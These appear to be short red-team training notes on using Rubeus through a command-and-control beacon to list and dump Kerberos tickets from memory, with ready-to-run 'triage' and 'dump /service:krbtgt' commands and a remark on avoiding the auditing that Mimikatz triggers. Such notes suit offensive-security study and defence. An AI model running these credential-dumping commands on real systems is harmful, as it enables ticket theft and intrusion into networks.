# Rubeus

## Introduction

One fault of Mimikatz is that it obtains handles to sensitive resources (SAM, LSASS, etc.) and can be audited easily. Rubeus, uses legitimate Windows API to obtain it's information about the host.

## Credential Dumping

### Triage

Rubeus' `triage` command lists all Kerberos tickets in the current logon session. If run with elevated privileges, it will list logon sessions on the machine.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```

### Dump

Rubeus' dump command will dump the tickets from memory. If not elevated, we can only pull our current session. We need to pass `/luid` and `/service` parameters (found in `triage` command).

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt
```

This will output the tickets in base64 format. We can add the `/nowrap` parameter for easy copy / paste.

